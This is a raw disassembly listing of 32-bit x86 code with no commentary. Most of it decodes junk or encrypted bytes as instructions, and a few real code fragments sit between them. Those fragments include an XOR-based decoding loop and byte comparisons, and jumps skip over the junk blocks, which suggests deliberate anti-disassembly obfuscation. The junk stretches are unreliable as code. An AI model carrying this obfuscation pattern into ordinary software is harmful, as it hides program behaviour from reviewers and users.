  4032bd:	sub    esi,DWORD PTR [edi+0x685ee6f8]
  4032c3:	or     ecx,DWORD PTR [esi-0x57]
  4032c6:	(bad)
  4032c9:	inc    esp
  4032ca:	push   ebp
  4032cb:	sub    ecx,DWORD PTR [ebp+0x4adcd069]
  4032d1:	sub    BYTE PTR [ecx],ch
  4032d3:	lock ror DWORD PTR [ebx],1
  4032d6:	(bad)  
  4032d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032d8:	mov    bl,0x25
  4032da:	test   BYTE PTR [eax],0xea
  4032dd:	(bad)  
  4032de:	aam    0xa9
  4032e0:	into   
  4032e1:	push   ecx
  4032e2:	xor    BYTE PTR [ebx+0x3930e881],bh
  4032e8:	mov    WORD PTR [edx+0x33],es
  4032eb:	outs   dx,DWORD PTR ds:[esi]
  4032ec:	adc    BYTE PTR [esi+0x6ec03c95],bl
  4032f2:	das    
  4032f3:	add    al,0x1e
  4032f5:	push   0x1970f1d8
  4032fa:	inc    eax
  4032fb:	neg    BYTE PTR [eax]
  4032fd:	fs xchg esp,eax
  4032ff:	add    BYTE PTR [eax],dh
  403301:	(bad)
  403307:	cmp    eax,0xf80bc92d
  40330c:	dec    ebx
  40330d:	push   esi
  40330e:	push   edi
  40330f:	xchg   ebp,eax
  403310:	adc    BYTE PTR [esi],bh
  403312:	cmc    
  403313:	mov    ebx,0x7a5f72ca
  403318:	inc    edi
  403319:	xchg   edi,eax
  40331a:	mov    al,0xe1
  40331c:	inc    ecx
  40331d:	sbb    ah,BYTE PTR [ebx-0x56]
  403320:	dec    ecx
  403321:	(bad)  
  403322:	aaa    
  403323:	push   ds
  403324:	in     eax,0xcd
  403326:	test   BYTE PTR [eax+0x44],bh
  403329:	shl    BYTE PTR [ebp+0xf],1
  40332c:	into   
  40332d:	xor    al,0x63
  40332f:	xchg   esi,eax
  403330:	(bad)  
  403332:	push   esp
  403333:	pop    ss
  403334:	add    bl,dl
  403336:	call   0xf21e:0x2d5f39a1
  40333d:	and    BYTE PTR [edi+edi*4-0x439a1a3a],cl
  403344:	scas   eax,DWORD PTR es:[edi]
  403345:	addr16 or al,0x44
  403348:	imul   ebx,DWORD PTR [esi-0x1de66ba2],0xf7bfef64
  403352:	fmulp  st(7),st
  403354:	mov    bh,0xb1
  403356:	ins    BYTE PTR es:[edi],dx
  403357:	test   eax,0x4a044cba
  40335c:	push   cs
  40335d:	fld    st(2)
  40335f:	push   ebx
  403360:	mov    ah,0xbc
  403362:	mov    bl,0xec
  403364:	loopne 0x403374
  403366:	push   ebp
  403367:	jne    0x4032f6
  403369:	sub    al,0x36
  40336b:	into   
  40336c:	in     al,dx
  40336d:	xor    ebp,DWORD PTR [edx-0x23]
  403370:	stos   DWORD PTR es:[edi],eax
  403371:	xchg   esp,eax
  403372:	xor    eax,0x70ba21ac
  403377:	add    al,0x5a
  403379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40337a:	jnp    0x403397
  40337c:	mov    dh,0xec
  40337e:	xor    eax,0x1d2d545c
  403383:	push   0xffffff9c
  403385:	cs inc esp
  403387:	sti    
  403388:	inc    edx
  403389:	jg     0x4033bc
  40338b:	mul    DWORD PTR [ecx-0x2d]
  40338e:	and    edx,DWORD PTR [edx-0x21]
  403391:	sbb    eax,0x6b678cf8
  403396:	fwait
  403397:	in     al,dx
  403398:	mov    dl,BYTE PTR [eax-0x32e5679]
  40339e:	(bad)  
  40339f:	or     edx,edi
  4033a1:	sbb    BYTE PTR [edx],0x6
  4033a4:	add    al,0xf5
  4033a6:	aas    
  4033a7:	xchg   BYTE PTR [eax],bl
  4033a9:	call   0x90d17672
  4033ae:	push   ds
  4033af:	test   al,0x84
  4033b1:	fld    st(4)
  4033b3:	cs cmp eax,0xb4f6ee6
  4033b9:	out    dx,eax
  4033ba:	imul   esi,esp,0xbb916214
  4033c0:	loop   0x4033ad
  4033c2:	into   
  4033c3:	jo     0x40336e
  4033c5:	dec    eax
  4033c6:	jae    0x40338b
  4033c8:	arpl   WORD PTR [eax],bx
  4033ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033cb:	cmp    dl,BYTE PTR [edx+0x45]
  4033ce:	test   eax,0x3f049ca1
  4033d3:	lock loope 0x4033f9
  4033d6:	sbb    al,0x3d
  4033d8:	cmc    
  4033d9:	xchg   edi,eax
  4033da:	push   edi
  4033db:	in     eax,dx
  4033dc:	inc    esi
  4033dd:	retf   0x3a0b
  4033e0:	inc    eax
  4033e1:	jmp    0xba817f18
  4033e6:	data16 aaa 
  4033e8:	inc    esp
  4033e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033eb:	sbb    al,0x35
  4033ed:	cwde   
  4033ee:	fs rcl edi,cl
  4033f1:	in     al,dx
  4033f2:	or     eax,0x10e79fcd
  4033f7:	add    BYTE PTR [eax+0x7319b655],cl
  4033fd:	cmp    eax,0xbc7da725
  403402:	leave  
  403403:	pop    es
  403404:	and    BYTE PTR [ecx+0x69fba1e0],bl
  40340a:	sub    dh,BYTE PTR [esi+0x20d0b01b]
  403410:	adc    BYTE PTR [ecx-0x43fc382],bh
  403416:	mov    edx,0x729bbe0c
  40341b:	xor    al,BYTE PTR [eax]
  40341d:	neg    DWORD PTR ds:0x4302d9
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	lock in eax,0xec
  403455:	fiadd  DWORD PTR [edx]
  403457:	adc    al,0x7e
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x40340d
  40345f:	sub    DWORD PTR [esi+0x4ee37fa4],ecx
  403465:	aas    
  403466:	jecxz  0x4034b1
  403468:	push   ecx
  403469:	jle    0x403482
  40346b:	fcom   DWORD PTR [ecx-0x26]
  40346e:	push   eax
  40346f:	xor    al,0xa8
  403471:	repnz sti 
  403473:	push   0x55
  403475:	mov    esi,0xf327ebf1
  40347a:	test   BYTE PTR [edi+ebp*1-0x71],dl
  40347e:	jmp    0x1921ebcf
  403483:	ret    
  403484:	ret    
  403485:	inc    ebp
  403486:	popf   
  403487:	popf   
  403488:	inc    ecx
  403489:	stos   BYTE PTR es:[edi],al
  40348a:	rep stos BYTE PTR es:[edi],al
  40348c:	xchg   edi,eax
  40348d:	lea    esi,[ecx-0x7a0ae14a]
  403493:	gs stos BYTE PTR es:[edi],al
  403495:	dec    edi
  403496:	mov    dh,0x62
  403498:	and    ebx,esi
  40349a:	jmp    0x40342b
  40349c:	sub    DWORD PTR [edx],eax
  40349e:	rcl    DWORD PTR [ebx-0x76],1
  4034a1:	aad    0x17
  4034a3:	sbb    al,0xab
  4034a5:	aaa    
  4034a6:	mov    eax,0x264269ec
  4034ab:	(bad)  
  4034ac:	fs in  al,0xb1
  4034af:	out    dx,al
  4034b0:	push   ds
  4034b1:	mov    eax,ds:0x49b8224
  4034b6:	inc    esp
  4034b7:	sahf   
  4034b8:	retf   
  4034b9:	sub    DWORD PTR [edi+0x2a1a3063],ebp
  4034bf:	jae    0x403477
  4034c1:	mov    eax,ds:0x1862d88a
  4034c6:	(bad)  
  4034c7:	je     0x40346b
  4034c9:	push   0xcf137f6c
  4034ce:	cdq    
  4034cf:	movaps xmm7,XMMWORD PTR [ebx]
  4034d2:	mov    ch,0x59
  4034d4:	out    0x30,eax
  4034d6:	ss pop ss
  4034d8:	cwde   
  4034d9:	sahf   
  4034da:	shl    DWORD PTR [esi-0x2baa2f4f],cl
  4034e0:	test   al,0x4
  4034e2:	cmp    BYTE PTR [ebx+0x46],0x7f
  4034e6:	ret    
  4034e7:	pop    ecx
  4034e8:	cs popa 
  4034ea:	inc    esi
  4034eb:	adc    al,0xe0
  4034ee:	aad    0x2c
  4034f0:	pusha  
  4034f1:	add    bl,dh
  4034f3:	cdq    
  4034f4:	repnz sub ch,BYTE PTR [eax-0x28]
  4034f8:	cmp    ch,BYTE PTR [eax-0x55]
  4034fb:	cdq    
  4034fc:	ins    BYTE PTR es:[edi],dx
  4034fd:	sub    ch,dh
  4034ff:	outs   dx,BYTE PTR ds:[esi]
  403500:	mov    cl,BYTE PTR [esi+0x55]
  403503:	mov    ecx,0x5fda1e83
  403508:	lock in eax,0x1a
  40350b:	jp     0x4034b8
  40350d:	xchg   esi,eax
  40350e:	les    esi,FWORD PTR [esi-0x6a2fc384]
  403514:	dec    ecx
  403515:	jle    0x4034bb
  403517:	pop    eax
  403518:	add    eax,0x94df1d08
  40351d:	cli    
  40351e:	xchg   edx,eax
  40351f:	sub    dl,BYTE PTR [ebx+0x5a]
  403522:	out    0x72,al
  403524:	and    DWORD PTR [esi],0x7f
  403527:	push   ds
  403528:	xor    DWORD PTR [edi+0xde6efde],eax
  40352e:	ds fs push edi
  403531:	and    al,0xb2
  403533:	test   DWORD PTR [ecx],0x504dcf8
  403539:	cmp    al,0xd5
  40353b:	std    
  40353c:	mov    ss,WORD PTR [ebx+0x75]
  40353f:	(bad)  
  403541:	daa    
  403542:	mov    DWORD PTR [ecx-0x20],ebp
  403545:	mov    ch,0xa5
  403547:	add    DWORD PTR [esi+0x3a],0x6b
  40354b:	xchg   ebx,eax
  40354c:	pminub mm0,mm3
  40354f:	test   DWORD PTR [edi],0x59dd60d
  403555:	(bad)  
  403556:	fmul   st,st(2)
  403558:	cmp    dl,BYTE PTR [ecx+edi*8+0x48303ad7]
  40355f:	sub    BYTE PTR [esi],0x7e
  403562:	lods   eax,DWORD PTR ds:[esi]
  403563:	in     eax,0x9f
  403565:	mov    esi,0x19c07561
  40356a:	(bad)  
  40356b:	icebp  
  40356c:	jge    0x4035b6
  40356e:	les    eax,FWORD PTR [esi+0x14e53a54]
  403574:	aad    0xbe
  403576:	xor    edi,DWORD PTR [esi+0x6dfbc594]
  40357c:	scas   eax,DWORD PTR es:[edi]
  40357d:	sbb    al,0xd
  40357f:	push   edx
  403580:	mov    WORD PTR [ecx-0x56],?
  403583:	fdivp  st(5),st
  403585:	fcomip st,st(1)
  403587:	push   0xf6b5d830
  40358c:	push   ebx
  40358d:	xchg   ecx,eax
  40358e:	or     al,0x4d
  403590:	dec    ecx
  403591:	cmp    DWORD PTR gs:[esi+0x2ab36f75],edi
  403598:	mov    BYTE PTR [ecx+ebx*2-0x7e],bl
  40359c:	test   DWORD PTR [ebx],edx
  40359e:	test   al,0x40
  4035a0:	jae    0x40357a
  4035a2:	pop    esp
  4035a3:	and    eax,0x77ac5a92
  4035a8:	jle    0x40359c
  4035aa:	or     DWORD PTR ss:[ecx],ecx
  4035ad:	test   DWORD PTR [eax],esi
  4035af:	jle    0x403594
  4035b1:	stos   DWORD PTR es:[edi],eax
  4035b2:	xchg   edx,eax
  4035b3:	xor    esp,DWORD PTR [esi-0x12ea7d11]
  4035b9:	jb     0x40354a
  4035bb:	and    DWORD PTR [edx+0x17bc6d8d],edi
  4035c1:	jl     0x4035f6
  4035c3:	xchg   edx,eax
  4035c4:	mov    cl,0x74
  4035c6:	int3   
  4035c7:	sti    
  4035c8:	mov    esp,0x49215786
  4035cd:	lahf   
  4035ce:	mov    bl,0xe3
  4035d0:	fbstp  TBYTE PTR ds:0xb59b97e2
  4035d6:	add    cl,ch
  4035d8:	aad    0x7e
  4035da:	xchg   edx,eax
  4035db:	rcl    al,cl
  4035dd:	push   eax
  4035de:	pop    es
  4035df:	or     al,0xd7
  4035e1:	fsub   QWORD PTR [ecx+eax*8]
  4035e4:	jne    0x4035e0
  4035e6:	jmp    0xed44ea39
  4035eb:	pop    ds
  4035ec:	lods   eax,DWORD PTR ds:[esi]
  4035ed:	pop    ebx
  4035ee:	push   ebp
  4035ef:	mov    bh,0x6b
  4035f1:	xor    al,0x93
  4035f3:	sbb    al,0x33
  4035f5:	xlat   BYTE PTR ds:[ebx]
  4035f6:	retf   
  4035f7:	in     eax,dx
  4035f8:	cmp    eax,0x3916c94e
  4035fd:	xor    esi,DWORD PTR [ecx+0x4e]
  403600:	aas    
  403601:	sbb    al,0x4c
  403603:	lods   eax,DWORD PTR ds:[esi]
  403604:	sub    BYTE PTR [ebp-0x18],bl
  403607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403608:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403609:	outs   dx,BYTE PTR ds:[esi]
  40360a:	cld    
  40360b:	xchg   BYTE PTR [edi-0x7d],dl
  40360e:	xor    edx,ecx
  403610:	add    edx,esi
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0x623dd7c8
  40366f:	and    eax,0x15b28878
  403674:	jle    0x4036f4
  403676:	scas   al,BYTE PTR es:[edi]
  403677:	jg     0x4036f7
  403679:	jle    0x403661
  40367b:	push   edi
  40367c:	mov    esp,DWORD PTR [eax+0x571d2ecd]
  403682:	les    ecx,FWORD PTR [esi+0x17]
  403685:	aaa    
  403686:	fdivp  st(6),st
  403688:	mov    esi,0x119a5632
  40368d:	sti    
  40368e:	xchg   DWORD PTR [ebx],edi
  403690:	in     eax,dx
  403691:	mov    fs,WORD PTR [esp+ebx*4-0x1514d3e3]
  403698:	aaa    
  403699:	cli    
  40369a:	jecxz  0x40365a
  40369c:	ffree  st(4)
  40369e:	xchg   BYTE PTR [ebx+0x791ecadf],al
  4036a4:	int3   
  4036a5:	push   cs
  4036a6:	cmp    BYTE PTR [ebp+ecx*2-0x7e],0x6
  4036ab:	push   esp
  4036ac:	cwde   
  4036ad:	add    BYTE PTR [eax],ah
  4036af:	and    ebx,DWORD PTR [ecx]
  4036b1:	sub    BYTE PTR [edi+ebp*2],dl
  4036b4:	sub    esp,DWORD PTR [ebp+0x50b5f6b8]
  4036ba:	inc    ebp
  4036bb:	pop    ebp
  4036bc:	pop    ss
  4036bd:	mov    ecx,0xe1b245f5
  4036c2:	jae    0x40366d
  4036c4:	push   0x77
  4036c6:	jmp    0x6945:0xaafc5dee
  4036cd:	sbb    al,0xbd
  4036cf:	fild   QWORD PTR [edx+0x338a96f2]
  4036d5:	and    DWORD PTR [ecx],ebp
  4036d7:	fst    DWORD PTR [ebp+ebx*1-0x3d748452]
  4036de:	jmp    0xec2a13b5
  4036e3:	stos   DWORD PTR es:[edi],eax
  4036e4:	dec    ecx
  4036e5:	out    0xfe,eax
  4036e7:	and    BYTE PTR [eax+0x24],bh
  4036ea:	sbb    DWORD PTR [ebx-0x21],ecx
  4036ed:	mov    cl,dh
  4036ef:	mov    ds:0xb98d8bac,al
  4036f4:	push   ebp
  4036f5:	sbb    BYTE PTR [ebp-0x45],0xe5
  4036f9:	(bad)  
  4036fb:	push   eax
  4036fc:	outs   dx,DWORD PTR ds:[esi]
  4036fd:	push   ebp
  4036fe:	push   cs
  4036ff:	xchg   edi,eax
  403700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403701:	push   0x6bf49a64
  403706:	push   ecx
  403707:	adc    eax,0xf250d8c5
  40370c:	sar    DWORD PTR [ebp-0x2c2e53fb],0x49
  403713:	jo     0x40369e
  403715:	adc    cl,BYTE PTR [edx+0x2468215b]
  40371b:	sub    eax,0x36f1acc8
  403720:	aas    
  403721:	or     al,0x3f
  403723:	inc    ecx
  403724:	pop    ds
  403725:	adc    al,0xe5
  403727:	mov    DWORD PTR [ebx],ebx
  403729:	mov    cl,0xc0
  40372b:	daa    
  40372c:	lahf   
  40372d:	imul   esp,DWORD PTR [edx+ebx*8-0x19],0x3a313eba
  403735:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403736:	cmp    ebp,edx
  403738:	mov    ebx,0xd803e04c
  40373d:	xor    DWORD PTR [eax],eax
  40373f:	pop    ebp
  403740:	(bad)  
  403741:	mov    ?,WORD PTR [esi+0x8]
  403744:	add    ecx,DWORD PTR [esi]
  403746:	pop    ss
  403747:	sub    ch,dh
  403749:	test   al,0xed
  40374b:	inc    ebp
  40374c:	push   esp
  40374d:	(bad)  
  40374e:	jne    0x4036df
  403750:	xchg   ebp,eax
  403751:	imul   ebx,DWORD PTR [ebx+0x23],0xdb0b81d7
  403758:	jns    0x4037ae
  40375a:	mov    ecx,0x79c158b5
  40375f:	imul   eax,esp,0x53a111fe
  403765:	iret   
  403766:	inc    ebx
  403767:	stos   BYTE PTR es:[edi],al
  403768:	data16 xor BYTE PTR fs:[esi+0x16],bl
  40376d:	xlat   BYTE PTR ds:[ebx]
  40376e:	mov    ebp,0xa27743d8
  403773:	bound  ebp,QWORD PTR [esi+0x3]
  403776:	clc    
  403777:	mov    sp,0x2734
  40377b:	cmp    BYTE PTR [edi+esi*8-0x2dd8036c],0xeb
  403783:	mov    esi,0xfee94038
  403788:	and    cl,ch
  40378a:	jmp    0x6efa:0xf30b0954
  403791:	mov    al,0xc9
  403793:	sar    BYTE PTR [ebx+0x65],0xd6
  403797:	jg     0x403800
  403799:	pusha  
  40379a:	lea    edx,[eiz*4-0x26cc649]
  4037a1:	outs   dx,DWORD PTR ds:[esi]
  4037a2:	add    edi,DWORD PTR [eax-0x29478782]
  4037a8:	mov    edi,0xe9ea7b83
  4037ad:	loop   0x40372f
  4037af:	and    al,0x29
  4037b1:	cli    
  4037b2:	xlat   BYTE PTR ds:[ebx]
  4037b3:	add    edx,esi
  4037b5:	test   al,0x94
  4037b7:	mov    ch,0xed
  4037b9:	out    0xc3,eax
  4037bb:	cli    
  4037bc:	inc    ebx
  4037bd:	mov    ebp,0xeabff533
  4037c2:	push   es
  4037c3:	sahf   
  4037c4:	pop    ebx
  4037c5:	sbb    al,0x5b
  4037c7:	hlt    
  4037c8:	stc    
  4037c9:	sbb    BYTE PTR ds:0x7014769d,dh
  4037cf:	xor    al,0xf1
  4037d1:	repnz mov esp,0x4b6026e3
  4037d7:	or     ax,0x7de1
  4037db:	dec    ecx
  4037dc:	xchg   esp,ebx
  4037de:	or     ch,BYTE PTR [edx-0x2]
  4037e1:	mov    bl,0xdc
  4037e3:	inc    esi
  4037e4:	daa    
  4037e5:	jbe    0x403784
  4037e7:	push   es
  4037e8:	or     ebp,edx
  4037ea:	js     0x4037a5
  4037ec:	out    0x7c,al
  4037ee:	mov    dh,0x61
  4037f0:	out    0xc8,al
  4037f2:	dec    esp
  4037f3:	pop    edx
  4037f4:	les    esi,FWORD PTR [ecx-0x41]
  4037f7:	rcr    BYTE PTR [edi-0x51],1
  4037fa:	lock fcmovne st,st(0)
  4037fd:	sbb    dl,ch
  4037ff:	and    dl,BYTE PTR [ecx+ecx*8-0x73]
  403803:	and    al,0x3b
  403805:	add    edx,edi
  403807:	pop    ebx
  403808:	cmp    esi,DWORD PTR [esi+0xf407b1b]
  40380e:	jg     0x403850
  403810:	cmp    BYTE PTR [ecx-0x56],al
  403813:	sahf   
  403814:	sub    eax,0x73132f19
  403819:	test   BYTE PTR [eax+esi*4+0x6f164bfe],ch
  403820:	and    DWORD PTR [ecx-0x67],eax
  403823:	cmp    edx,DWORD PTR [edx+0xea3802]
  403829:	dec    edi
  40382a:	mov    edx,DWORD PTR [ebp+0x10]
  40382d:	xor    eax,ecx
  40382f:	add    eax,esi
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0x6a6e6f23
  403845:	xor    esp,edx
  403847:	adc    edi,DWORD PTR [esi+0x7e]
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x4037f6
  40384f:	(bad)  
  403851:	xchg   BYTE PTR [esi],dl
  403853:	int3   
  403854:	lahf   
  403855:	mov    al,ds:0x4e6dbaad
  40385a:	stos   BYTE PTR es:[edi],al
  40385b:	or     eax,0xfc7efced
  403860:	adc    ebx,DWORD PTR [ebx+0x48]
  403863:	sub    al,0xb0
  403865:	adc    ch,ah
  403867:	pop    ss
  403868:	fwait
  403869:	cmp    esp,DWORD PTR [eax+edx*4]
  40386c:	pop    eax
  40386d:	int3   
  40386e:	mov    cl,0x8b
  403870:	aam    0xe1
  403872:	add    esi,DWORD PTR [ecx]
  403874:	jl     0x4038f4
  403876:	inc    edi
  403877:	jo     0x403866
  403879:	call   0x84fdf750
  40387e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40387f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403880:	xor    eax,0x8f267d8f
  403885:	mov    eax,0x6e07a84
  40388a:	or     ecx,esp
  40388c:	and    ah,BYTE PTR [edi]
  40388e:	loop   0x403815
  403890:	or     DWORD PTR [edx+0x16],ebp
  403893:	fisub  DWORD PTR [esi+0x3d8386cb]
  403899:	ror    BYTE PTR [ebp-0x167fada7],cl
  40389f:	dec    ebp
  4038a0:	jo     0x40387e
  4038a2:	sbb    ebx,ebp
  4038a4:	xchg   esi,eax
  4038a5:	dec    eax
  4038a6:	jne    0x4038aa
  4038a8:	push   esp
  4038a9:	push   ebx
  4038aa:	mov    bl,bl
  4038ac:	and    esp,esp
  4038ae:	in     eax,0xe6
  4038b0:	and    al,0x32
  4038b2:	lea    ecx,[edx-0x18f97931]
  4038b8:	mov    bl,0x72
  4038ba:	ret    0xa1ee
  4038bd:	sbb    BYTE PTR [ebp+0x43b0ab70],bl
  4038c3:	cmp    ecx,DWORD PTR [eax+0x207f7675]
  4038c9:	inc    ecx
  4038ca:	pop    ss
  4038cb:	mov    WORD PTR [ecx],ss
  4038cd:	xchg   ecx,ecx
  4038cf:	(bad)  
  4038d0:	shl    DWORD PTR [ebx-0x6b],1
  4038d3:	push   edx
  4038d4:	mov    bh,0xbb
  4038d6:	jge    0x4038bb
  4038d8:	inc    eax
  4038d9:	js     0x4038bc
  4038db:	stos   DWORD PTR es:[edi],eax
  4038dc:	out    dx,eax
  4038dd:	push   ss
  4038de:	push   esi
  4038df:	clc    
  4038e0:	sbb    al,0xed
  4038e2:	popa   
  4038e3:	cmp    DWORD PTR [esp+ebp*2],ebp
  4038e6:	xchg   edx,eax
  4038e7:	xchg   edx,eax
  4038e8:	jns    0x4038f4
  4038ea:	sbb    eax,edi
  4038ec:	(bad)  
  4038ed:	jmp    0x8e78:0x6fa12df3
  4038f4:	mov    ah,0xc0
  4038f6:	cmp    ah,dh
  4038f8:	sub    al,0x1c
  4038fa:	xchg   ebp,eax
  4038fb:	retf   
  4038fc:	sbb    eax,0x8c754cc9
  403901:	stos   DWORD PTR es:[edi],eax
  403902:	pop    ebp
  403903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403904:	mov    bh,0xeb
  403906:	outs   dx,BYTE PTR ds:[esi]
  403907:	xchg   esp,eax
  403908:	add    DWORD PTR [esi+ecx*1],edi
  40390b:	mov    ebp,0x51e41746
  403910:	push   cs
  403911:	fwait
  403912:	push   DWORD PTR [ebx+0x9]
  403915:	jle    0x40397f
  403917:	dec    ebp
  403918:	(bad)  
  403919:	inc    ebx
  40391a:	push   edx
  40391b:	jo     0x4038ed
  40391d:	pop    ebx
  40391e:	mov    ss,WORD PTR [ebx+0x7421d09]
  403924:	sbb    DWORD PTR ds:0xe702642,ebp
  40392a:	into   
  40392b:	stc    
  40392c:	or     eax,0xd9840e37
  403931:	mov    al,ds:0xd06bd47b
  403936:	clc    
  403937:	mov    bl,0x3e
  403939:	mov    cl,0x75
  40393b:	fucomip st,st(3)
  40393d:	sbb    bh,al
  40393f:	push   ds
  403940:	in     al,0x15
  403942:	mov    ebx,0x41d01de7
  403947:	in     al,dx
  403948:	xchg   BYTE PTR [ebx+0x5e0fb139],bh
  40394e:	inc    bl
  403950:	cli    
  403951:	mov    esi,0xe833f763
  403956:	aam    0xcf
  403958:	xchg   esi,eax
  403959:	retf   
  40395a:	mov    al,0x7a
  40395c:	mov    ds:0x5bf2016a,al
  403961:	lds    edi,FWORD PTR [ebx+0x1d]
  403964:	(bad)  
  403965:	add    ebx,esp
  403967:	xchg   edx,eax
  403968:	lea    ebp,[ecx]
  40396a:	and    al,0x2b
  40396c:	into   
  40396d:	or     al,0x4f
  40396f:	cld    
  403970:	inc    esp
  403971:	inc    esp
  403972:	mov    edx,0x83c13f4c
  403977:	sub    eax,edi
  403979:	mov    esp,0xbfd6da44
  40397e:	push   eax
  40397f:	dec    ebp
  403980:	dec    esp
  403981:	xor    al,BYTE PTR [ebx-0x7c1a45a8]
  403987:	jmp    0x22da704f
  40398c:	enter  0x1c,0x12
  403990:	dec    BYTE PTR [edi-0x112cd2c3]
  403996:	push   ss
  403997:	sbb    BYTE PTR [edi+0x2],al
  40399a:	push   ebx
  40399b:	jno    0x403963
  40399d:	xor    al,0xe6
  40399f:	dec    ebx
  4039a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039a1:	mov    esp,0xf7605db1
  4039a6:	retf   
  4039a7:	xor    al,BYTE PTR [ebp+0x40]
  4039aa:	push   edi
  4039ab:	pop    esp
  4039ac:	dec    esp
  4039ad:	stc    
  4039ae:	cmp    ah,cl
  4039b0:	pop    eax
  4039b1:	sbb    ebx,DWORD PTR [edi+edx*1]
  4039b4:	push   ss
  4039b5:	ficomp WORD PTR [esi+eiz*2-0x6da754fc]
  4039bc:	fild   DWORD PTR [ebx-0x2120471b]
  4039c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039c3:	sbb    eax,0xc44da18f
  4039c8:	adc    BYTE PTR [eax-0x26],ah
  4039cb:	cmp    bl,cl
  4039cd:	aaa    
  4039ce:	push   cs
  4039cf:	lahf   
  4039d0:	int    0x50
  4039d2:	mov    edx,0xae3c9b77
  4039d7:	add    edi,DWORD PTR [ebx]
  4039d9:	fs sti 
  4039db:	repz popa 
  4039dd:	shl    DWORD PTR [ecx],1
  4039df:	mov    al,0x39
  4039e1:	adc    DWORD PTR [ebx+0x56880e07],ebx
  4039e7:	lds    ecx,FWORD PTR [edi*2-0x464a909e]
  4039ee:	arpl   WORD PTR [esi+0x25],bp
  4039f1:	in     eax,dx
  4039f2:	adc    cl,dl
  4039f4:	addr16 or eax,0x80c3da73
  4039fa:	stos   BYTE PTR es:[edi],al
  4039fb:	test   BYTE PTR [edi-0x74fd7612],cl
  403a01:	inc    ebp
  403a02:	clc    
  403a03:	xor    eax,ecx
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0xf68bf61d
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403acc
  403a5b:	popf   
  403a5c:	mov    esp,0xbd629d23
  403a61:	shl    DWORD PTR [eax-0x25],1
  403a64:	mov    al,ds:0xbe9968ff
  403a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a6b:	(bad)  
  403a6c:	js     0x403aba
  403a6e:	pop    edi
  403a6f:	xor    ch,0x40
  403a72:	xor    BYTE PTR [edx],dh
  403a74:	xchg   esp,edi
  403a76:	cmp    BYTE PTR [ebp-0x6c],ch
  403a79:	xchg   ecx,eax
  403a7a:	fisttp WORD PTR [esp+edi*4-0x4546d5b1]
  403a81:	xchg   esi,eax
  403a82:	fimul  WORD PTR [bp+si]
  403a85:	sub    BYTE PTR [ecx],ah
  403a87:	push   edi
